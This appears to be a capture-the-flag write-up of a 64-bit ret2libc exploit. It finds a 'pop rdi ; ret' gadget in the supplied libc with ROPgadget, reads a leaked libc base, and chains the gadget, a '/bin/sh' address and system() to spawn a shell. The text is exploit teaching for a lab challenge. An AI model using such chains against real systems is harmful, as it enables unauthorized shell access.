# Writeup

This task is similar to `32-bit ROP chains`, but this time the ROP chain is a little more complex. Since arguments are passed in registers instead of on the stack, we need a gadget that does `pop rdi ; ret` to set up our argument to `system()`. We're provided with `libc`, so we can grab a gadget from there.

```
$ ROPgadget --binary libc-2.19.so > gadgets
$ cat gadgets | grep ": pop rdi ; ret"
0x0000000000022482 : pop rdi ; ret
0x0000000000181f10 : pop rdi ; ret 0xffef
```

We'll set up our ROP chain like this:
```
pop rdi gadget
"/bin/sh"
system
```

For the 64-bit version, we first have to get the `libc` base address:
```python2
r.recvuntil("libc start address: ")
libc_base = int(r.recvline().strip(), 16)
log.info("libc base: %s" % hex(libc_base))
```

And then we have to modify our ROP chain a bit:
```python2

pop_rdi_ret = 0x22482 + libc_base
log.info("pop rdi gadget: %s" % hex(pop_rdi_ret))
rop = p64(pop_rdi_ret)
rop += p64(bin_sh)
rop += p64(system_addr)
```

Full solution script can be found [here](src/solv.py).
